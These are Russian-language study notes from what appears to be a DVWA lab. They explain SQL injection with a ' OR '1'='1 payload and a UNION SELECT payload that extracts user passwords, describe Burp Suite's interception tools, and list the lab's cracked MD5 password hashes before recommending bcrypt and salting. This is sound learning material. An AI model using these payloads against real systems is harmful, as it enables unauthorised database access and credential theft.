## SQL Injection — как это работает

Любой сайт с базой данных отправляет SQL запросы внутри себя.

Когда вводишь `1` в поле User ID — сайт формирует запрос:
```sql
SELECT * FROM users WHERE id = '1'
```

Когда вводишь `' OR '1'='1` — запрос становится:
```sql
SELECT * FROM users WHERE id = '' OR '1'='1'
```

**Почему сработало:**
- `WHERE id = ''` — ложное условие
- `OR '1'='1'` — всегда истина
- База вернула ВСЕ записи потому что OR истинно для каждой строки

**Апостроф `'`** — главный символ SQLi. Он "вырывается" из строки
и позволяет дописать свой SQL код. Разработчик ждал число — получил SQL код.

## UNION SELECT — как достали пароли

Введённый payload:
```sql
1' UNION SELECT user, password FROM users-- -
```

Запрос стал:
```sql
SELECT first_name, last_name FROM users WHERE id='1'
UNION
SELECT user, password FROM users-- -
```

- `UNION` — присоединяет второй SELECT к первому
- Читает колонки `user` и `password` из таблицы `users`
- `-- -` в конце — комментарий в SQL, всё после игнорируется

## Burp Suite — зачем нужен

Burp Suite встаёт **посередине** между браузером и сервером:

```
Браузер → Burp Suite → Сервер
Браузер ← Burp Suite ← Сервер
```

### Основные инструменты:

**Intercept** — режим паузы
- Ловит запрос и держит пока не нажмёшь Forward
- Можно менять любые параметры прямо в запросе

**Repeater** — лаборатория
- Берёшь один запрос и отправляешь снова и снова
- Меняешь параметры — видишь разные ответы сервера
- Не нужно каждый раз заходить на сайт и заполнять форму

**HTTP History** — история всех запросов
- Видишь что браузер отправлял за всю сессию
- Полезно для анализа как работает приложение

## Найденные хэши паролей (MD5)

| Пользователь | MD5 хэш | Реальный пароль |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

### Почему MD5 слабый:
- MD5 детерминирован — одинаковый пароль = одинаковый хэш всегда
- Существуют Rainbow Tables — базы с миллиардами пар пароль→хэш
- CrackStation просто ищет хэш в этой базе
- admin и smithy имеют одинаковый хэш — значит одинаковый пароль!

### Современная защита:
- bcrypt или Argon2 вместо MD5
- Специально медленные алгоритмы
- Используют соль (случайные данные) — одинаковые пароли дают разные хэши
